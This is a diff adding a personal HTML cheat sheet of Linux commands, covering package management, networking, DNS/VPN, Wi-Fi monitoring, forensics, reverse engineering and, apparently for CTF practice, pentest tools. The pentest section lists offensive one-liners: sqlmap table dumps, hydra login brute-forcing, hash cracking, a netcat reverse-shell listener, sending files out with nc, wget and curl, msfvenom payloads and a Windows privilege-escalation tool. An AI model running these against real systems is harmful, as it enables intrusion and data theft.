@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Linux commands | gloomydog</title>
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon.png">
+<link rel="stylesheet" href="../style.css?v=8">
+</head>
+<body>
+<main>
+  <div class="prompt"><span class="user">gloomydog</span>:<span class="path">~/tips</span>$ cat linux-command.html</div>
+  <article class="doc">
+    <h1>Linux commands</h1>
+    <p>A personal cheat sheet of Linux commands I keep coming back to. Updated whenever I learn or forget something new.</p>
+    <ul>
+      <li><a href="#pacman">Pacman</a></li>
+      <li><a href="#process">Process &amp; Login</a></li>
+      <li><a href="#system">System Info</a></li>
+      <li><a href="#disk">Disk</a></li>
+      <li><a href="#network">Network</a></li>
+      <li><a href="#dns-vpn">DNS &amp; VPN</a></li>
+      <li><a href="#wifi">Wi-Fi Monitoring</a></li>
+      <li><a href="#archive">Archive</a></li>
+      <li><a href="#sandbox-wine">Sandbox &amp; Wine</a></li>
+      <li><a href="#pdf-image">PDF &amp; Images</a></li>
+      <li><a href="#video-gif">Video &amp; GIF</a></li>
+      <li><a href="#github">GitHub</a></li>
+      <li><a href="#text-search">Text &amp; Search</a></li>
+      <li><a href="#forensics">Forensics &amp; Steganography</a></li>
+      <li><a href="#reverse-eng">Reverse Engineering</a></li>
+      <li><a href="#pentest">Pentest Tools</a></li>
+      <li><a href="#bluetooth">Bluetooth</a></li>
+      <li><a href="#shell-misc">Shell &amp; Misc</a></li>
+    </ul>
+    <h2 id="pacman">Pacman</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>pacman -Qm</code></td><td>list foreign/AUR packages</td></tr>
+      <tr><td><code>pacman -Qn</code></td><td>list official repo packages</td></tr>
+      <tr><td><code>sudo pacman -Rns xxx</code></td><td>remove a package and its unneeded dependencies</td></tr>
+      <tr><td><code>sudo paccache -r</code></td><td>delete old cached package versions, keep the latest</td></tr>
+      <tr><td><code>sudo pacman -Scc</code></td><td>delete all cached packages</td></tr>
+      <tr><td><code>du -sh /var/cache/pacman/pkg/</code></td><td>check the size of the package cache</td></tr>
+      <tr><td><code>sudo pacman -Ss &lt;name&gt;</code></td><td>search the repos</td></tr>
+      <tr><td><code>sudo pacman -Si &lt;name&gt;</code></td><td>show info for a repo package</td></tr>
+      <tr><td><code>pacman -Qo /path/to/file</code></td><td>find which package owns a file</td></tr>
+      <tr><td><code>pacman -Ql &lt;name&gt; | grep '\.so'</code></td><td>list the .so files a package provides</td></tr>
+      </tbody>
+    </table>
+    <h2 id="process">Process &amp; Login</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>ps aux | grep xxx</code></td><td>find a running process by name</td></tr>
+      <tr><td><code>pkill -9 bwrap</code></td><td>force-kill all bubblewrap sandboxes</td></tr>
+      <tr><td><code>type &lt;cmd&gt;</code></td><td>check whether a command is a shell builtin or an external binary</td></tr>
+      <tr><td><code>who</code></td><td>list logged-in users and their sessions (tty/pts)</td></tr>
+      <tr><td><code>grep -v -E "nologin|false" /etc/passwd</code></td><td>list accounts that have a real login shell</td></tr>
+      <tr><td><code>crontab -l</code></td><td>list the current user's cron jobs</td></tr>
+      <tr><td><code>sudo crontab -l -u root</code></td><td>list root's cron jobs</td></tr>
+      <tr><td><code>ls /etc/cron.d/ ; cat /etc/crontab</code></td><td>check system-wide cron jobs (a common persistence spot)</td></tr>
+      <tr><td><code>d rwx r-x r-x</code></td><td>permission bits: type (d=dir, l=symlink, -=file) + owner/group/other, r=4 w=2 x=1 (755 is common)</td></tr>
+      </tbody>
+    </table>
+    <h2 id="system">System Info</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>lscpu</code></td><td>CPU info</td></tr>
+      <tr><td><code>lsusb -t</code></td><td>USB devices as a tree</td></tr>
+      <tr><td><code>lspci</code></td><td>PCI devices</td></tr>
+      <tr><td><code>lspci | grep -i vga</code></td><td>find the GPU</td></tr>
+      <tr><td><code>lsscsi</code></td><td>SCSI/SATA/NVMe disk list</td></tr>
+      <tr><td><code>echo $XDG_SESSION_TYPE</code></td><td>check Wayland vs X11</td></tr>
+      <tr><td><code>which xxx</code></td><td>find a command's path</td></tr>
+      <tr><td><code>echo $PATH</code></td><td>show the current PATH</td></tr>
+      <tr><td><code>echo 'export PATH="$HOME/.local/bin:$PATH"' &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code></td><td>add a directory to PATH permanently</td></tr>
+      <tr><td><code>systemctl enable xxx<br>systemctl start xxx<br>systemctl status xxx</code></td><td>enable / start / check a systemd service</td></tr>
+      <tr><td><code>cat /proc/sys/vm/swappiness</code></td><td>check swappiness (0-200, higher = swap more, more CPU load)</td></tr>
+      <tr><td><code>sudo sh -c 'echo 3 &gt; /proc/sys/vm/drop_caches'</code></td><td>drop page/dentry/inode caches (1=page, 2=dentry+inode, 3=both)</td></tr>
+      <tr><td><code>ldd &lt;binary&gt;</code></td><td>list the shared libraries a binary needs</td></tr>
+      <tr><td><code>type &lt;cmd&gt;</code></td><td>builtin vs external command (see also Process)</td></tr>
+      <tr><td><code>MALLOC_CHECK_=0 &lt;program&gt;</code></td><td>workaround for a glibc malloc-check crash in a Linux port</td></tr>
+      </tbody>
+    </table>
+    <h2 id="disk">Disk</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>df -T</code></td><td>mounted filesystems and their type</td></tr>
+      <tr><td><code>lsblk</code></td><td>block devices as a tree</td></tr>
+      <tr><td><code>df -h</code></td><td>disk usage, human-readable</td></tr>
+      <tr><td><code>lsblk -o NAME,MODEL,SIZE,TYPE,MOUNTPOINT</code></td><td>disks with model and mountpoint</td></tr>
+      <tr><td><code>findmnt /</code></td><td>show what's mounted at a path</td></tr>
+      <tr><td><code>sudo fdisk -l</code></td><td>list partitions</td></tr>
+      <tr><td><code>ls -l /dev/disk/by-id/</code></td><td>disks by stable ID</td></tr>
+      <tr><td><code>ncdu ~ --exclude-caches</code></td><td>interactive disk usage browser</td></tr>
+      <tr><td><code>lsblk --discard</code></td><td>check TRIM support (DISC-MAX &gt; 0)</td></tr>
+      <tr><td><code>systemctl status fstrim.timer</code></td><td>check the weekly TRIM timer</td></tr>
+      <tr><td><code>smartctl -a /dev/sda</code></td><td>S.M.A.R.T. health info for an HDD/SATA SSD</td></tr>
+      <tr><td><code>smartctl -a /dev/nvme0</code></td><td>S.M.A.R.T. health info for an NVMe SSD</td></tr>
+      </tbody>
+    </table>
+    <h2 id="network">Network</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>ping xxx.com</code></td><td>basic reachability check (tries https first, falls back to http)</td></tr>
+      <tr><td><code>curl -sI https://xxx.com</code></td><td>check a site's HTTP response headers only</td></tr>
+      <tr><td><code>curl -4 https://ifconfig.me</code></td><td>force IPv4 and show the public IP</td></tr>
+      <tr><td><code>curl -6 https://ifconfig.me</code></td><td>force IPv6 and show the public IP</td></tr>
+      <tr><td><code>ip addr ; ip a</code></td><td>show interfaces and addresses</td></tr>
+      <tr><td><code>ip addr show | grep inet</code></td><td>show just the inet/inet6 lines</td></tr>
+      <tr><td><code>curl ifconfig.me<br>curl ipinfo.io/ip<br>curl ipv4.icanhazip.com ; curl -6 ipv6.icanhazip.com<br>dig +short myip.opendns.com @resolver1.opendns.com</code></td><td>check the global/public IP, several ways</td></tr>
+      <tr><td><code>whois 8.8.8.8 | grep -i origin</code></td><td>look up the ASN that owns an IP</td></tr>
+      <tr><td><code>ss -tulnp</code></td><td>listening sockets with the owning process (-t TCP -u UDP -l listen -n numeric -p pid)</td></tr>
+      <tr><td><code>sudo ss -tupn | grep ESTAB</code></td><td>currently established connections</td></tr>
+      <tr><td><code>sudo conntrack -L</code></td><td>show the kernel connection-tracking table</td></tr>
+      <tr><td><code>sudo ip link delete tun0</code></td><td>remove a leftover tun/VPN interface</td></tr>
+      <tr><td><code>ip link ; sudo p0f -i &lt;iface&gt;</code></td><td>passive OS fingerprinting from the TCP/IP stack of a captured connection</td></tr>
+      </tbody>
+    </table>
+    <h2 id="dns-vpn">DNS &amp; VPN</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>resolvectl status</code></td><td>current DNS servers, DoT/DNSSEC status</td></tr>
+      <tr><td><code>resolvectl query &lt;domain&gt;</code></td><td>see which server answered a query</td></tr>
+      <tr><td><code>dig example.com</code></td><td>A record lookup</td></tr>
+      <tr><td><code>dig example.com MX</code></td><td>lookup a specific record type</td></tr>
+      <tr><td><code>dig @8.8.8.8 example.com</code></td><td>query a specific DNS server</td></tr>
+      <tr><td><code>dig +short example.com</code></td><td>short output</td></tr>
+      <tr><td><code>dig -x 203.0.113.1</code></td><td>reverse lookup</td></tr>
+      <tr><td><code>dig +trace example.com</code></td><td>trace resolution from the root</td></tr>
+      <tr><td><code>dig +noall +answer example.com</code></td><td>answer section only</td></tr>
+      <tr><td><code>ip -br link</code></td><td>quick check for a tun/wg/tailscale interface</td></tr>
+      <tr><td><code>ip route get 1.1.1.1</code></td><td>check whether the default route goes through the VPN</td></tr>
+      <tr><td><code>nmcli connection show --active</code></td><td>check whether the active connection type is vpn/wireguard</td></tr>
+      <tr><td><code>wg show</code></td><td>WireGuard interface and peer details</td></tr>
+      <tr><td><code>systemctl is-active firewalld ufw nftables iptables</code></td><td>check which firewall is active</td></tr>
+      <tr><td><code>sudo ufw status</code></td><td>firewall rule list</td></tr>
+      <tr><td><code>sudo ufw allow 2222/tcp</code></td><td>open a port</td></tr>
+      <tr><td><code>sudo ufw delete allow 2222/tcp</code></td><td>close a port</td></tr>
+      <tr><td><code>getent hosts ad.doubleclick.net</code></td><td>check whether a domain is blocked at the resolver (0.0.0.0/empty = blocked)</td></tr>
+      <tr><td><code>dig doubleclick.net +short ; dig archlinux.org +short</code></td><td>confirm an ad-block list is working without breaking normal resolution</td></tr>
+      <tr><td><code>systemctl status NetworkManager systemd-networkd iwd 2&gt;/dev/null | grep -E 'NetworkManager|networkd|iwd|Active:'</code></td><td>check which network stack owns the connection</td></tr>
+      <tr><td><code>nmcli connection show</code></td><td>list known Wi-Fi/network connection profiles</td></tr>
+      <tr><td><code>sudo nmcli connection modify "&lt;conn&gt;" ipv4.dns "127.0.0.1"<br>sudo nmcli connection modify "&lt;conn&gt;" ipv4.ignore-auto-dns yes<br>sudo nmcli connection up "&lt;conn&gt;"</code></td><td>point a connection at a local DNS resolver (e.g. AdGuard Home)</td></tr>
+      <tr><td><code>nmcli dev show wlp1s0 | grep DNS</code></td><td>confirm the DNS server actually in use</td></tr>
+      <tr><td><code>iw dev wlp1s0 link</code></td><td>SSID, signal strength, tx/rx rate</td></tr>
+      <tr><td><code>nmcli device show wlp1s0</code></td><td>detailed status of a Wi-Fi device</td></tr>
+      <tr><td><code>sudo mv ~/Downloads/xx-wg-001.conf /etc/wireguard/mullvad.conf<br>sudo systemctl enable --now wg-quick@mullvad</code></td><td>install and auto-start a Mullvad WireGuard config</td></tr>
+      <tr><td><code>sudo wg-quick up mullvad ; sudo wg-quick down mullvad</code></td><td>bring the WireGuard tunnel up/down manually</td></tr>
+      <tr><td><code>curl https://am.i.mullvad.net/connected</code></td><td>confirm the Mullvad connection is active</td></tr>
+      <tr><td><code>sudo -i</code></td><td>become root to read files under /etc/wireguard (exit or Ctrl+D to leave)</td></tr>
+      <tr><td><code>sudo systemctl enable --now systemd-resolved</code></td><td>enable the systemd DNS resolver</td></tr>
+      <tr><td><code>sudo nano /etc/systemd/resolved.conf</code></td><td>set DNS=/FallbackDNS=/DNSOverTLS=yes/DNSSEC=yes for DNS-over-TLS</td></tr>
+      <tr><td><code>sudo ln -sf /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf<br>sudo systemctl restart systemd-resolved</code></td><td>point resolv.conf at the systemd-resolved stub and apply</td></tr>
+      <tr><td><code>sudo mkdir -p /etc/systemd/resolved.conf.d<br># add DNSStubListener=no in a .conf there<br>sudo systemctl restart systemd-resolved</code></td><td>free port 53 so AdGuard Home can bind it</td></tr>
+      <tr><td><code>sudo ss -ltnup 'sport = :53'</code></td><td>confirm what's listening on port 53</td></tr>
+      <tr><td><code>sudo systemctl enable --now adguardhome<br>sudo rm /etc/resolv.conf<br>echo "nameserver 127.0.0.1" | sudo tee /etc/resolv.conf</code></td><td>start AdGuard Home and route local DNS through it</td></tr>
+      </tbody>
+    </table>
+    <h2 id="wifi">Wi-Fi Monitoring</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>sudo ip link set &lt;iface&gt; down<br>sudo iw dev &lt;iface&gt; set type monitor<br>sudo ip link set &lt;iface&gt; up</code></td><td>switch a Wi-Fi adapter into monitor mode</td></tr>
+      <tr><td><code>iw dev &lt;iface&gt; info</code></td><td>confirm the interface is in monitor mode</td></tr>
+      <tr><td><code>sudo ip link set &lt;iface&gt; down<br>sudo iw dev &lt;iface&gt; set type managed<br>sudo ip link set &lt;iface&gt; up</code></td><td>switch back to managed mode</td></tr>
+      <tr><td><code>nmcli device wifi list ifname &lt;iface&gt;<br>nmcli device wifi connect "&lt;SSID&gt;" password "&lt;pass&gt;" ifname &lt;iface&gt;</code></td><td>reconnect to a known network after leaving monitor mode</td></tr>
+      <tr><td><code>sudo airodump-ng &lt;iface&gt;</code></td><td>scan nearby access points (BSSID/PWR/CH/ENC/ESSID)</td></tr>
+      <tr><td><code>sudo airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w capture &lt;iface&gt;</code></td><td>capture traffic for one specific access point</td></tr>
+      <tr><td><code>sudo airmon-ng stop &lt;iface&gt;</code></td><td>stop monitor mode</td></tr>
+      <tr><td><code>sudo wireshark -i &lt;iface&gt; -k</code></td><td>capture live in Wireshark</td></tr>
+      <tr><td><code>sudo tcpdump -i &lt;iface&gt; -w capture.pcap</code></td><td>capture to a pcap file from the CLI</td></tr>
+      <tr><td><code>wavemon -i &lt;iface&gt;</code></td><td>live signal strength / link quality</td></tr>
+      </tbody>
+    </table>
+    <h2 id="archive">Archive</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>tar -xzf xxx.tar.gz</code></td><td>extract a .tar.gz</td></tr>
+      <tr><td><code>tar -czvf xxx.tar.gz &lt;dir&gt;</code></td><td>create a .tar.gz, verbosely</td></tr>
+      <tr><td><code>unrar x game.rar /dest</code></td><td>extract a .rar</td></tr>
+      <tr><td><code>7z x *.7z -o./dest</code></td><td>extract a .7z</td></tr>
+      <tr><td><code>unzip game.zip -d ./dest</code></td><td>extract a .zip</td></tr>
+      </tbody>
+    </table>
+    <h2 id="sandbox-wine">Sandbox &amp; Wine</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>export WINEPREFIX=$HOME/.wine-game</code></td><td>use a separate Wine prefix per game/app</td></tr>
+      <tr><td><code>WINEDLLOVERRIDES="dcomp=" wine game.exe</code></td><td>fix a black screen from an unimplemented dcomp.dll (DirectComposition) call</td></tr>
+      <tr><td><code>ps aux | grep -E "bubblejail|bwrap"</code></td><td>list running bubblejail sandboxes</td></tr>
+      <tr><td><code>pkill -9 bwrap<br>rm -rf /run/user/$(id -u)/bubblejail/my-sandbox*</code></td><td>force-kill a stuck sandbox and clear its runtime state</td></tr>
+      <tr><td><code>bubblejail run my-sandbox -- bash</code></td><td>enter a bubblejail sandbox (without `-- bash` it can exit immediately with "No children found")</td></tr>
+      </tbody>
+    </table>
+    <h2 id="pdf-image">PDF &amp; Images</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>pdfimages -list aaa.pdf</code></td><td>list the images embedded in a PDF</td></tr>
+      <tr><td><code>pdftoppm -r 400 -gray -png aaa.pdf pages/p<br>img2pdf pages/*.png -o hires.pdf</code></td><td>re-render an image-only PDF at higher DPI, then rebuild it as a PDF (improves the reported pixel density)</td></tr>
+      <tr><td><code>ocrmypdf --image-dpi 400 -l eng hires.pdf out.pdf</code></td><td>OCR a PDF so the text becomes selectable (slow, and the file grows)</td></tr>
+      <tr><td><code>pdfimages -png -jp2 input.pdf m/p</code></td><td>extract JBIG2/JPX images as PNG (faster path for scanned PDFs)</td></tr>
+      <tr><td><code>img2pdf m/*.png -o masks.pdf<br>ocrmypdf --image-dpi 300 -l eng masks.pdf output.pdf</code></td><td>rebuild from the extracted pages and OCR (fast, lossless, but needs all pages in the same encoding)</td></tr>
+      <tr><td><code>libreoffice --headless --convert-to png presentation.pptx</code></td><td>render slides to PNG without opening LibreOffice's UI</td></tr>
+      <tr><td><code>pdftoppm -png -r 150 presentation.pdf slide</code></td><td>render PDF pages to PNG at a given DPI</td></tr>
+      </tbody>
+    </table>
+    <h2 id="video-gif">Video &amp; GIF</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>ffmpeg -i demo.mp4 -vf "fps=15,scale=800:-1:flags=lanczos" demo.gif</code></td><td>convert a video to GIF</td></tr>
+      <tr><td><code>ffmpeg -i demo.webm -vf "fps=15,scale=800:-1:flags=lanczos,palettegen" palette.png<br>ffmpeg -i demo.webm -i palette.png -filter_complex "fps=15,scale=800:-1:flags=lanczos[x];[x][1:v]paletteuse" demo.gif</code></td><td>same, with a generated palette for better GIF color quality</td></tr>
+      <tr><td><code>ffmpeg -i input.webm -crf 20 -c:v libx264 -c:a aac output.mp4</code></td><td>convert webm to mp4 (lower crf = higher quality)</td></tr>
+      <tr><td><code>chafa --format=sixel xx.png</code></td><td>preview a PNG in the terminal</td></tr>
+      <tr><td><code>chafa demo.gif</code></td><td>preview a GIF in the terminal</td></tr>
+      </tbody>
+    </table>
+    <h2 id="github">GitHub</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>git config --global user.name &lt;name&gt;<br>git config --global user.email &lt;email&gt;</code></td><td>one-time global git identity</td></tr>
+      <tr><td><code>gh auth login</code></td><td>log in to GitHub from the CLI</td></tr>
+      <tr><td><code>git init<br>git add .<br>git commit -m "Initial commit"<br>gh repo create &lt;name&gt; --public --source=. --push</code></td><td>turn a local folder into a new GitHub repo (use --private to keep it private)</td></tr>
+      <tr><td><code>git add README.md<br>git commit -m "Update README"<br>git push</code></td><td>the usual edit/commit/push loop</td></tr>
+      <tr><td><code>![screenshot](images/screenshot.png)<br>![screencast](images/screencast.gif)</code></td><td>embed an image/GIF in a README</td></tr>
+      <tr><td><code>```math ... ```<br>$`...`$</code></td><td>math blocks / inline math in a GitHub README</td></tr>
+      </tbody>
+    </table>
+    <h2 id="text-search">Text &amp; Search</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>find /path -name "*.txt"</code></td><td>find by name</td></tr>
+      <tr><td><code>find /path -iname "*.txt"</code></td><td>find by name, case-insensitive</td></tr>
+      <tr><td><code>find /path -type f -name "*.txt"</code></td><td>files only</td></tr>
+      <tr><td><code>find /path -type d -name logs</code></td><td>directories only</td></tr>
+      <tr><td><code>find /path -mtime -7</code></td><td>modified in the last 7 days</td></tr>
+      <tr><td><code>find /path -size +100M</code></td><td>larger than 100 MB</td></tr>
+      <tr><td><code>find /path -user &lt;name&gt;</code></td><td>owned by a given user</td></tr>
+      <tr><td><code>find / -perm -4000 2&gt;/dev/null</code></td><td>find SUID binaries</td></tr>
+      <tr><td><code>find / -perm /6000 2&gt;/dev/null</code></td><td>find SUID or SGID binaries</td></tr>
+      <tr><td><code>fd pattern /path</code></td><td>find files/dirs matching a pattern (fd)</td></tr>
+      <tr><td><code>fd -e txt</code></td><td>by extension</td></tr>
+      <tr><td><code>fd -t f pattern ; fd -t d pattern</code></td><td>files only / directories only</td></tr>
+      <tr><td><code>fd -H pattern</code></td><td>include hidden files</td></tr>
+      <tr><td><code>fd -I pattern</code></td><td>ignore .gitignore rules</td></tr>
+      <tr><td><code>fd -x &lt;command&gt;</code></td><td>run a command on each match</td></tr>
+      <tr><td><code>grep -rl "text" / --exclude-dir={proc,sys,dev} 2&gt;/dev/null</code></td><td>search file contents recursively, skipping virtual filesystems</td></tr>
+      <tr><td><code>grep -rlI "text" / 2&gt;/dev/null</code></td><td>same, skipping binary files</td></tr>
+      <tr><td><code>grep -oP "key=\K\S+"</code></td><td>extract only the value after a known key (\K drops the match before it)</td></tr>
+      <tr><td><code>grep -w 80/tcp /etc/services</code></td><td>whole-word match, no partial hits</td></tr>
+      <tr><td><code>grep -E '\b(53|332)\b' file</code></td><td>match either of two exact numbers</td></tr>
+      <tr><td><code>find / -type f -name xxx 2&gt;/dev/null | xargs grep -l "text" 2&gt;/dev/null</code></td><td>pipe find results into grep via xargs</td></tr>
+      <tr><td><code>find / -type f -name xxx -exec grep -l "text" {} \; 2&gt;/dev/null</code></td><td>same, using -exec instead of xargs</td></tr>
+      <tr><td><code>cat $(ls | grep root.txt)</code></td><td>cat a file whose name has odd characters, via a glob-free workaround</td></tr>
+      <tr><td><code>cat -- "$(ls)"</code></td><td>cat a file whose name starts with a dash</td></tr>
+      </tbody>
+    </table>
+    <h2 id="forensics">Forensics &amp; Steganography</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>steghide embed -cf xxx.jpg -ef secret.txt</code></td><td>hide a file inside an image/audio file</td></tr>
+      <tr><td><code>steghide info xxx.jpg</code></td><td>check whether a file has embedded data</td></tr>
+      <tr><td><code>steghide extract -sf xxx.jpg</code></td><td>extract the hidden file</td></tr>
+      <tr><td><code>zsteg xxx.png</code></td><td>find extra data appended after a PNG's IEND chunk</td></tr>
+      <tr><td><code>binwalk xx.png</code></td><td>identify embedded files/signatures inside a file</td></tr>
+      <tr><td><code>dd if=cutie.png of=extracted.zip bs=1 skip=&lt;offset&gt;</code></td><td>carve out data appended after an image's real end (use when binwalk -e fails)</td></tr>
+      <tr><td><code>exiftool xx.jpg</code></td><td>show metadata/EXIF</td></tr>
+      <tr><td><code>exiftool -a -u -g1 file.jpg</code></td><td>show all metadata, grouped by category</td></tr>
+      <tr><td><code>exiftool -all= file.jpg</code></td><td>strip all metadata</td></tr>
+      <tr><td><code>exiftool -Comment="text" -overwrite_original file.jpg</code></td><td>edit metadata in place without an _original backup</td></tr>
+      <tr><td><code>echo "..." | base64 -d</code></td><td>decode a base64 string</td></tr>
+      </tbody>
+    </table>
+    <h2 id="reverse-eng">Reverse Engineering</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>gdb ./xxx</code></td><td>start gdb</td></tr>
+      <tr><td><code>disassemble main</code></td><td>disassemble a function (inside gdb)</td></tr>
+      <tr><td><code>break *0x333333 ; run</code></td><td>set a breakpoint at an address and run (inside gdb)</td></tr>
+      <tr><td><code>x/4xb $rbp-0x4</code></td><td>examine memory: count/format/unit, e.g. 4 bytes in hex (inside gdb)</td></tr>
+      <tr><td><code>objdump -d xxx</code></td><td>disassemble a binary</td></tr>
+      <tr><td><code>pwn checksec ./binary</code></td><td>check RELRO/canary/NX/PIE/stripped (pwntools)</td></tr>
+      <tr><td><code>getcap -r / 2&gt;/dev/null</code></td><td>find binaries with Linux capabilities set</td></tr>
+      <tr><td><code>find / -type f -exec getcap {} \; 2&gt;/dev/null</code></td><td>same, via find</td></tr>
+      <tr><td><code>getfattr -n security.capability -e text /path/to/binary</code></td><td>read a binary's capability xattr directly</td></tr>
+      </tbody>
+    </table>
+    <h2 id="pentest">Pentest Tools</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>gobuster dir -u xxx.com -w wordlist.txt</code></td><td>brute-force hidden directories/files over HTTP</td></tr>
+      <tr><td><code>gobuster dns -d xx.com -w wordlist.txt</code></td><td>brute-force subdomains via DNS</td></tr>
+      <tr><td><code>ffuf -w wordlist.txt -u https://target.com/FUZZ -fs 0</code></td><td>fuzz a URL path/parameter, filtering out a known response size</td></tr>
+      <tr><td><code>ffuf -w wordlist.txt -u http://target.com -H "Host: FUZZ.target.com" -fw &lt;N&gt; -fs 0</code></td><td>fuzz for subdomains via the Host header</td></tr>
+      <tr><td><code>sqlmap -u "URL" --dbs</code></td><td>enumerate databases behind a SQL injection</td></tr>
+      <tr><td><code>sqlmap -u "URL" -D db --tables</code></td><td>enumerate tables in a database</td></tr>
+      <tr><td><code>sqlmap -u "URL" -D db -T users --columns</code></td><td>enumerate columns in a table</td></tr>
+      <tr><td><code>sqlmap -u "URL" -D db -T users --dump</code></td><td>dump a table's data</td></tr>
+      <tr><td><code>john --format=phpass --wordlist=rockyou.txt hash.txt</code></td><td>crack password hashes with John the Ripper</td></tr>
+      <tr><td><code>hashcat -m &lt;mode&gt; -a 0 hash.txt wordlist.txt</code></td><td>crack password hashes with hashcat (-m selects the hash type)</td></tr>
+      <tr><td><code>hydra -l &lt;user&gt; -P &lt;passlist&gt; &lt;target&gt; -t &lt;threads&gt;</code></td><td>brute-force a login with one user, many passwords</td></tr>
+      <tr><td><code>hydra -l admin -P passwords.txt &lt;target&gt; http-post-form "/login.php:username=^USER^&amp;password=^PASS^:F=Invalid credentials" -t 64</code></td><td>brute-force a web login form</td></tr>
+      <tr><td><code>wpscan --url http://xxx -U &lt;user&gt; -P wordlist.txt</code></td><td>brute-force a WordPress login</td></tr>
+      <tr><td><code>rustscan -a &lt;ip&gt; -- -sC -sV -oN rust.log</code></td><td>fast port scan, handing results to nmap scripts</td></tr>
+      <tr><td><code>nc -lvnp &lt;port&gt;</code></td><td>listen on a port (reverse-shell catcher)</td></tr>
+      <tr><td><code>nc &lt;ip&gt; &lt;port&gt;</code></td><td>connect out to a host/port</td></tr>
+      <tr><td><code>nc -lvnp 4444 &gt; received_file</code></td><td>receive a file over a netcat listener</td></tr>
+      <tr><td><code>nc &lt;ip&gt; 4444 &lt; target_file</code></td><td>send a file to a netcat listener</td></tr>
+      <tr><td><code>smbclient -L //&lt;ip&gt;/</code></td><td>list SMB shares on a Windows host</td></tr>
+      <tr><td><code>wget --post-file=file.txt http://target:port</code></td><td>POST a file's contents with wget</td></tr>
+      <tr><td><code>wget http://host:port/file.txt</code></td><td>download a file with wget</td></tr>
+      <tr><td><code>ftp -p &lt;ip&gt; &lt;port&gt;</code></td><td>connect over FTP (passive mode)</td></tr>
+      <tr><td><code>ssh -o HostKeyAlgorithms=+ssh-rsa &lt;ip&gt; -p &lt;port&gt;</code></td><td>connect with ssh-rsa, which newer OpenSSH disables by default</td></tr>
+      <tr><td><code>scp user@host:/remote/file ./local/</code></td><td>copy a file down over SSH</td></tr>
+      <tr><td><code>scp ./file.txt user@host:/remote/path/</code></td><td>copy a file up over SSH</td></tr>
+      <tr><td><code>curl -A &lt;ua&gt; http://...</code></td><td>set a custom User-Agent</td></tr>
+      <tr><td><code>curl -F "file=@target_file" http://&lt;ip&gt;:4444</code></td><td>upload a file with curl (multipart)</td></tr>
+      <tr><td><code>msfvenom -p &lt;payload&gt; LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f &lt;format&gt; -o &lt;out&gt;</code></td><td>generate a Metasploit payload</td></tr>
+      <tr><td><code>PrintSpoofer64.exe -i -c cmd</code></td><td>Windows privilege escalation via SeImpersonatePrivilege</td></tr>
+      <tr><td><code>rbash: echo $SHELL</code></td><td>check whether the shell is restricted</td></tr>
+      </tbody>
+    </table>
+    <h2 id="bluetooth">Bluetooth</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>sudo systemctl enable --now bluetooth</code></td><td>enable and start the Bluetooth service</td></tr>
+      <tr><td><code>sudo btmgmt find</code></td><td>scan for nearby devices</td></tr>
+      <tr><td><code>sudo btmgmt info</code></td><td>show adapter info</td></tr>
+      <tr><td><code>sudo btmgmt power on</code></td><td>power the adapter on</td></tr>
+      <tr><td><code>sudo btmgmt discov on</code></td><td>make the adapter discoverable</td></tr>
+      </tbody>
+    </table>
+    <h2 id="shell-misc">Shell &amp; Misc</h2>
+    <table>
+      <thead><tr><th>Command</th><th>Description</th></tr></thead>
+      <tbody>
+      <tr><td><code>nano ~/.bashrc<br># PS1='\[\e[1;32m\][\u@\h \W]\[\e[0m\]\$ '<br>source ~/.bashrc</code></td><td>color the shell prompt (this one is green)</td></tr>
+      <tr><td><code>tmux</code></td><td>start a terminal multiplexer session</td></tr>
+      <tr><td><code>prefix = Ctrl+a ; prefix -&gt; "-" (split horizontally) ; prefix -&gt; "|" (split vertically) ; prefix -&gt; x (close pane) ; prefix -&gt; [ then v/y (vi-mode copy)</code></td><td>common tmux keybindings (with a custom prefix)</td></tr>
+      <tr><td><code>printf '\033c'</code></td><td>clear the screen when `clear` isn't available (e.g. a bare reverse shell)</td></tr>
+      <tr><td><code>python3 -m venv venv<br>source venv/bin/activate<br>pip install ...</code></td><td>create and use a Python virtual environment</td></tr>
+      <tr><td><code>pacman -Qo /usr/include/xxx.h</code></td><td>find which package owns a missing header</td></tr>
+      <tr><td><code>pkg-config --exists libxxx &amp;&amp; echo yes || echo no</code></td><td>check whether a .pc file exists for a library</td></tr>
+      <tr><td><code>pkg-config --cflags --libs libxxx</code></td><td>get the compiler/linker flags for a library</td></tr>
